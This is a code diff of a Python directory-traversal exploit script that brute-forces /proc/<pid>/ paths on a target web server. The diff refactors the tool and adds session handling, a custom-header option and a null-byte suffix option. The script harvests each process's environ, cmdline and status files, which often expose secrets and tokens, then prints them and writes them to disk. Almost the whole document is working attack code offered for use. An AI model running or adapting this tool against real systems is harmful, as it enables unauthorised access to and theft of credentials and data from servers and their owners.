@@ -10,12 +10,12 @@ from pathlib import Path
 
 def createDir(directory):
 	newdir=Path(os.getcwd(),directory)  
-	vprint("Creating {}".format(newdir))
+	vprint(f"Creating {newdir}")
 
 	try:
 		os.makedirs(newdir,0o775,True)
 	except FileExistsError:
-		print("{} already exists.".format(newdir))
+		print(f"{newdir} already exists.")
 		pass
 	except OSError as e:
 		raise e
@@ -49,7 +49,7 @@ def writeFile(filename,content,directory):
 	f=str(f).rstrip()
 
 	if len(content)>0:
-		print("Writing file {}".format(f))
+		print(f"Writing file {f}")
 		try:
 			fh = open(f,"w")
 			fh.write(content)
@@ -59,69 +59,11 @@ def writeFile(filename,content,directory):
 
 
 
-def main(args):
-	infoToGet=["cmdline","cwd","status","loginuid","comm","environ"]
-	max_pid=args.max_pid
-	url=args.url
-	outdir=args.outdir
-
-
-
-
-
-	# Create Output Directory if required
-	if outdir!=None:
-		print("Output directory: {}".format(outdir))
-		fulldir=createDir(outdir)
-	else:
-		fulldir=None
-
-
-	proc_url="{}/proc".format(url)
-
-	for pid in range (max_pid):
-		pid_url="{}/{}".format(proc_url,pid)
-
-		procinfo=dict.fromkeys(infoToGet)
-
-
-		for key in procinfo:
-			response=None
-			req_url="{}/{}".format(pid_url,key)
-
-			dprint(req_url)
-			response = requests.get(req_url,allow_redirects = False)
-
-			if response.status_code>300 and response.status_code <=399:
-				vprint("WARNING: Redirected to {}".format(response.headers["location"]))
-
-
-			if (response.status_code==200) or ( response.status_code>300 and response.status_code <=399 ):
-				if len(response.text)!=0: 
-					procinfo[key] = response.text   # was .content
-					print("/proc/{}/{}".format(pid,key))
-					print (procinfo[key])
-					if fulldir!=None:
-						writeFile("{}-{}".format(pid,key),response.text,fulldir)
-
-					print("----------------------------------------------------------")
-			else:
-				print("{} Error requesting {}.".format(str(response.status_code),req_url))
-				#print(str(r.status_code)+ " Error requesting "+url)
-				print("----------------------------------------------------------")
-
 		
 
-
-
-
-
-if __name__== '__main__':
-
+def parseArgs(argv):
 	parser = argparse.ArgumentParser( 
-	                                description = "Brute forces file descriptors for a given pid when you have Directory Traversal",
-	                                epilog = "As an alternative to the commandline, params can be placed in a file, one per line, and specified on the commandline like '%(prog)s @params.conf'.",
-	                                fromfile_prefix_chars = '@' )
+	                                description = "Brute forces /proc when you have Directory Traversal")
 
 	parser.add_argument(
 	                      "url",
@@ -147,6 +89,14 @@ if __name__== '__main__':
 
 
 	parser.add_argument(
+	                      "-H",
+	                      "--header",
+	                      help="add a custom header",
+	                      type=str,
+	                      action="store"
+	                      )
+
+	parser.add_argument(
 	                      "-v",
 	                      "--verbose",
 	                      help="increase output verbosity",
@@ -167,6 +117,102 @@ if __name__== '__main__':
 						  "--nullbyte",
 						  help="Appends a null byte (0x00) to each request. This may allow requests to web apps that automatically append a file extension.",
 						  action="store_true")
+	return parser.parse_args()	
+
+
+
+def main():
+	args = parseArgs(sys.argv)
+
+	global debug
+	global verbose
+	debug = args.debug
+	verbose=args.verbose
+
+	# Define a verbose printing mechanism
+	global vprint
+	vprint = print if args.verbose else lambda *a, **k: None
+
+	#define a seperate debug print
+	global dprint
+	dprint = print if args.debug else lambda *a, **k: None
+
+
+	infoToGet=["cmdline","status","loginuid","comm","environ"]
+	max_pid=args.max_pid
+	url=args.url
+	outdir=args.outdir
+
+	sess=requests.Session()
+
+
+	headerlist=args.header.split(":",maxsplit=1)
+	headers={headerlist[0].lstrip():headerlist[1].lstrip()}
+	vprint(headers)
+
+	sess.headers.update(headers)
+
+	# Create Output Directory if required
+	if outdir!=None:
+		print(f"Output directory: {outdir}")
+		fulldir=createDir(outdir)
+	else:
+		fulldir=None
+
+
+	proc_url=f"{url}/proc"
+
+	for pid in range (max_pid):
+		dprint(f"PID: {pid}")
+		reachable=True
+		pid_url=f"{proc_url}/{pid}"
+
+		procinfo=dict.fromkeys(infoToGet)
+
+
+		for key in procinfo:
+			response=None
+			req_url=f"{pid_url}/{key}"
+
+			dprint(req_url)
+			response = sess.get(req_url)
+
+			if response.status_code==404:
+				reachable=False
+				break
+
+			if response.status_code>300 and response.status_code <=399:
+				vprint(f"WARNING: Redirected to {response.headers['location']}")
+
+
+			if (response.status_code==200) or ( response.status_code>300 and response.status_code <=399 ):
+				if len(response.text)!=0: 
+					procinfo[key] = response.text   # was .content
+					print(f"/proc/{pid}/{key}")
+					print (procinfo[key])
+					if fulldir!=None:
+						#writeFile("{}-{}".format(pid,key),response.text,fulldir)
+						writeFile(f"{pid}-{key}",response.text,fulldir)
+
+					print("----------------------------------------------------------")
+			else:
+				vprint(f"{response.status_code} Error requesting {req_url}")
+				vprint("----------------------------------------------------------")
+		if not reachable:
+			dprint(f"{pid} not reachable. Skipping...")
+			continue
+
+
+
+if __name__== '__main__':
+	try:
+		main()
+	except KeyboardInterrupt or OSError:
+			print("ctrl-c detected. quitting")
+			exit(1)
+
+
+
 
 
 
@@ -174,13 +220,6 @@ if __name__== '__main__':
 		parser.print_help()
 		sys.exit()
 
-	args = parser.parse_args()
-
-	# Define a verbose printing mechanism
-	vprint = print if args.verbose else lambda *a, **k: None
-
-	#define a seperate debug print
-	dprint = print if args.debug else lambda *a, **k: None
 
 
 
